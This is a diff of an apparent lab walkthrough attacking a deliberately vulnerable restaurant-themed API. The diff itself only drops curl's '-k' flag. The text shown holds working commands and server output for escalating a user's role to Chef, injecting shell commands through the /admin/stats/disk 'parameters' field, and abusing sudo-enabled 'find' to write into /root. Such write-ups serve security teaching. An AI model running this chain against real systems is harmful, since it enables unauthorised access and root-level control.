@@ -34,14 +34,14 @@ curl -X GET http://192.168.1.2:8089/profile \
 
 ### get profile info
 ```bash
-curl -k -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile
+curl -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile
 
 {"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Customer"}
 ```
 
 ### hit the disk endpoint to see what type of response we get
 ```bash
-curl -k -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/admin/stats/disk
+curl -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/admin/stats/disk
 
 {"detail":"Only Chef is authorized to get current disk stats!"}
 ```
@@ -86,7 +86,7 @@ curl -X PUT http://192.168.1.2:8089/users/update_role \
 
 ### validate role
 ```bash
-curl -k -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile
+curl -H "Authorization: Bearer ${TOKEN}" http://192.168.1.2:8089/profile
 
 {"username":"testuser","first_name":"Test","last_name":"User","phone_number":"1234567890","role":"Employee"}
 ```
@@ -147,7 +147,7 @@ Promoted to Chef, not bad.
 
 ## attempt RCE via the /admin/stats/disk endpoint
 ```bash
-curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26echo%20vulnerable%21
+curl -H "Authorization: Bearer ${CHEF_TOKEN}" http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26echo%20vulnerable%21
 {"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\nvulnerable!"}
 ```
 So that works
@@ -155,7 +155,7 @@ So that works
 ### check for priv escalation opportunities
 #### check if the "app" user has any sudo capabilities that can be exploited:
 ```bash
-curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" \
+curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
 "http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20-l"
 {"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm\nMatching Defaults entries for app on 1847d1ddb7e1:\n    env_reset, mail_badpass, secure_path=/usr/local/sbin\\:/usr/local/bin\\:/usr/sbin\\:/usr/bin\\:/sbin\\:/bin\n\nUser app may run the following commands on 1847d1ddb7e1:\n    (ALL) NOPASSWD: /usr/bin/find"}
 ```
@@ -163,7 +163,7 @@ curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" \
 
 ### create a garbage file under /root
 ```bash
-curl -k -H "Authorization: Bearer ${CHEF_TOKEN}" \
+curl -H "Authorization: Bearer ${CHEF_TOKEN}" \
 "http://192.168.1.2:8089/admin/stats/disk?parameters=%26%26sudo%20/usr/bin/find%20/tmp%20-type%20f%20-exec%20/bin/sh%20-c%20'echo%20RCE%20test%20%3E%20/root/garbage.w00t'%20\\;"
 {"output":"Filesystem               Size  Used Avail Use% Mounted on\nfuse-overlayfs           149G  137G   13G  92% /\n/dev/mapper/fedora-root  149G  137G   13G  92% /app\ntmpfs                     64M     0   64M   0% /dev\ndevtmpfs                 4.0M     0  4.0M   0% /dev/mem\ntmpfs                    996M  1.2M  995M   1% /etc/hosts\nshm                       63M     0   63M   0% /dev/shm"}
 ```
